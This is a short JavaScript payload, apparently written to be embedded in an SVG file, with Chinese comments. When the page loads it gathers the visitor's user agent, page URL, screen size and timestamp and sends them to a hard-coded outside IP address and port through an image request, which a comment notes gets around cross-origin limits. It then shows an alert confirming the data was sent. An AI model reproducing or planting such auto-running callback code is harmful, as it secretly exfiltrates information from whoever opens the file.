svg.script:
// 配置区域 - 请修改为你的服务器IP或域名
const SERVER_IP = "38.162.113.47";  // 例如: "192.168.1.100" 或 "yourdomain.com"
const PORT = 4645;

// 收集客户端信息（可扩展）
const clientInfo = {
  userAgent: navigator.userAgent,
  location: window.location.href,
  screen: `${screen.width}x${screen.height}`,
  timestamp: new Date().toISOString()
};

// 发送反弹请求
function sendRebound() {
  try {
    // 创建请求URL（包含客户端信息）
    const query = new URLSearchParams(clientInfo).toString();
    const url = `http://${SERVER_IP}:${PORT}/rebound?${query}`;
    
    // 使用Image对象发送GET请求（无跨域限制）
    const img = new Image();
    img.src = url;
    
    // 成功提示
    alert("✅ SVG已加载！数据已反弹到服务器");
    console.log("反弹请求已发送:", url);
  } catch (error) {
    console.error("反弹请求失败:", error);
    alert("❌ 反弹请求失败，请检查服务器配置");
  }
}

// 页面加载时执行
window.onload = sendRebound;
